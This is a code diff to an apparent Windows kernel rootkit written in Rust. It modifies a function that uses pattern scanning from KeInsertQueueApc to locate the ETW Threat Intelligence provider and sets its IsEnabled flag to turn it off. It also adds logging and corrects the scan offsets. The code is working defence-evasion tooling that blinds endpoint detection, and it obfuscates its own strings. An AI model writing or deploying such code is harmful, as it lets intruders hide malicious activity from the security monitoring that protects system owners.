@@ -28,21 +28,40 @@ impl Etw {
     /// * `Ok(NTSTATUS)` - If the operation is successful.
     /// * `Err(ShadowError)` - If any error occurs while finding the function or modifying the ETWTI structure.
     pub unsafe fn etwti_enable_disable(enable: bool) -> Result<NTSTATUS> {
-        // Convert function name to Unicode string for lookup
+        log::info!("etwti_enable_disable: {} ETWTI", if enable { "Enabling" } else { "Disabling" });
+    
+        // Convert the function name for lookup. We're still using KeInsertQueueApc
+        // because it's exported and available.
         let mut function_name = uni::str_to_unicode(obfstr!("KeInsertQueueApc")).to_unicode();
-
-        // Get the system routine address for the function
+        log::debug!("etwti_enable_disable: Function name (Unicode): {:?}", function_name);
+    
+        // Retrieve the system routine address.
         let function_address = MmGetSystemRoutineAddress(&mut function_name);
-
-        // Scan for the ETWTI structure using a predefined pattern
-        let etwi_handle = scan_for_pattern(function_address, &ETWTI_PATTERN, 5, 9, 0x1000)?;
-
-        // Calculate the offset to the TRACE_ENABLE_INFO structure and modify the IsEnabled field
+        if function_address.is_null() {
+            log::error!("etwti_enable_disable: Failed to retrieve system routine address for KeInsertQueueApc");
+            return Err(ShadowError::FunctionExecutionFailed("MmGetSystemRoutineAddress", line!()));
+        }
+        log::info!("etwti_enable_disable: Retrieved system routine address: {:p}", function_address);
+    
+        // Scan for the ETWTI structure using the fixed 7-byte pattern.
+        // Use offset = 3 so that the 4-byte relative offset is read correctly,
+        // and final_offset = 7 so that the returned address points immediately after the instruction.
+        let etwi_handle = scan_for_pattern(function_address, &ETWTI_PATTERN, 3, 7, 0x1000)?;
+        log::info!("etwti_enable_disable: Found ETWTI structure at address: {:p}", etwi_handle);
+    
+        // Calculate the TRACE_ENABLE_INFO structure address and update its IsEnabled field.
         let trace_info = etwi_handle.offset(0x20).offset(0x60) as *mut TRACE_ENABLE_INFO;
-        (*trace_info).IsEnabled = if enable { 0x01 } else { 0x00 };
-
+        log::info!("etwti_enable_disable: TRACE_ENABLE_INFO located at: {:p}", trace_info);
+        let new_state = if enable { 0x01 } else { 0x00 };
+        (*trace_info).IsEnabled = new_state;
+        log::info!("etwti_enable_disable: Set TRACE_ENABLE_INFO::IsEnabled to {:#x}", new_state);
+    
+        log::info!("etwti_enable_disable: Operation successful");
         Ok(STATUS_SUCCESS)
     }
+    
+    
+    
 }
 
 /// Represents Driver Signature Enforcement (DSE) in the operating system.
